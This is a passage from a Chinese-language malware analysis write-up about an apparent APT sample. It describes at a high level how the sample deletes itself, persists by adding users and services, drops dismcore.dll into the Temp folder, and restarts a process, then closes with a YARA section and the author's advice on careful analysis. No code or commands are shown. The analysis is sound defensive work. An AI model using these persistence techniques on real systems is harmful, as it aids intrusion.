BhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01956b2e558d03bd76.png)
</li>
<li>第四：结束退出，也就是，断开连接，终止线程，删除自身<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t011d13b2f88aad0bba.png)<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01cf72aefd49fb5fd3.png)<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01d3f45b6ee5f4d3c2.png)
</li>
<li>第五：驻留操作。包含了释放资源，运行服务，添加用户等<br>[![](https://p2.ssl.qhimg.com/t010008a7553b240bd4.png)](https://p2.ssl.qhimg.com/t010008a7553b240bd4.png)<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01abe9ee9614b08ea6.png)<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01015266cbcbd2e730.png)<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t017d1846fee2b05d57.png)
</li>
### <a name="0x4.7_Resource.bin"></a>**0x3.7 Resource.bin**
<li>释放C:UsershackyAppDataLocalTempdismcore.dll和C:UsershackyAppDataLocalTempellocnak.xml<br>[![](https://p2.ssl.qhimg.com/t01552b1bb718fc2d18.png)](https://p2.ssl.qhimg.com/t01552b1bb718fc2d18.png)<br>[![](https://p1.ssl.qhimg.com/t0174ef86d55527e521.png)](https://p1.ssl.qhimg.com/t0174ef86d55527e521.png)
</li>
<li>然后调用C:Windowssystem32pkgmgr.exe，安装安装KB929761更新包，可能目的是排除竞争者<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t011e8a45fd6aa18f53.png)
</li>
### <a name="0x4.8_dismcore.dll"></a>**0x3.8 dismcore.dll**
<li>读取SOFTWARE_rptls的值，这个是其实是2XC2DF0S.exe的路径，然后截取去文件名。检查进程列表中是否存在这样的进程，有则关闭，然后在重新创建一个进程即可！<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01ec31b6d295f24ce6.png)
</li>


## 0x4 yara规则编写
- [![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t010f643b7200aab3b0.png)
## 0x5 后记

学习样本分析两年了，从最开始的简单的蠕虫到后来的勒索病毒，再到挖矿病毒，再到现在的APT样本。总结一下，样本分析最重要的是心细和心诚。心细不多说。何谓心诚，心诚则灵。对于样本，我们也需要有敬畏之心，需要刨根问题，也就是说，作为一个合格的病毒分析师，首先你需要判断文件黑白，但能够辨别黑白也只能给你打60分。如何成为一个优秀的病毒分析师?在于刨根问底，在于洞悉原理，不是简单的知道样本执行了什么操作。肉眼看到的仅仅都只是表面现象。就像这个样本那个宏一样，肉眼可见其实释放了一个exe，但是他是怎么释放的呢？你一概不知，这样你可能就失去了一个可靠的情报，或者说你很有可能凭借这过于自信的判断。导致**你对这样本的判断是错误的.**但是这对于用户来说是致命的。

专科学技术，本科学原理，博硕学辩证。对之于样本分析同，仅仅是懂得辩黑白仅仅就是专科的水平，不屑于言之，若能明晓原理，可达登堂入室之功，最后是辩证，也就是知道为何这样做是可行的，这样做是不可行的，不可行之处在于何处。以上与君共勉。
